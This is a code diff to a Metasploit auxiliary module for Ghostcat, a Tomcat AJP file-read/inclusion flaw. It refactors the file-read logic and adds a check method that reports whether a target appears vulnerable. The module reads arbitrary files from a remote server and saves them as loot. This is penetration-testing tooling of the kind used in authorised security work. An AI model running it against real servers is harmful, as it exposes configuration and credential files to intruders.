@@ -268,20 +268,13 @@ class MetasploitModule < Msf::Auxiliary
     parse_response(buf, idx)
   end
 
-  def parse_loot(header, content)
+  def read_success?(header)
     status_code = header.match(/Status Code: [0-9]{3}*/).to_s.split(/ /)[2]
-    if status_code == '200'
-      file = store_loot(
-        datastore['FILENAME'].to_s, 'text/plain', datastore['RHOST'].to_s,
-        content, 'Ghostcat File Read/Inclusion', 'Read file', datastore['FILENAME']
-      )
-      print_good file
-    else
-      print_error 'Read file error'
-    end
+
+    status_code == '200'
   end
 
-  def run
+  def read_remote_file
     headers = []
     method = 'GET'
     target_file = datastore['FILENAME'].to_s
@@ -293,8 +286,32 @@ class MetasploitModule < Msf::Auxiliary
     data = make_forward_request_package(method, headers, attributes)
     buf = send_recv_once(data)
     parse_response(buf, 0)
+  end
+
+  def check
+    read_remote_file
+    if read_success?(@header_data)
+      return Exploit::CheckCode::Appears("Successfully read file #{datastore['FILENAME']}")
+    end
+
+    Exploit::CheckCode::Safe
+  rescue StandardError => e
+    Exploit::CheckCode::Unknown(e.message)
+  end
+
+  def run
+    read_remote_file
     print @header_data
     print @body_data
-    parse_loot(@header_data, @body_data)
+
+    if read_success?(@header_data)
+      file = store_loot(
+        datastore['FILENAME'].to_s, 'text/plain', datastore['RHOST'].to_s,
+        @body_data, 'Ghostcat File Read/Inclusion', 'Read file', datastore['FILENAME']
+      )
+      print_good file
+    else
+      print_error 'Unable to read file, target may not be vulnerable.'
+    end
   end
 end
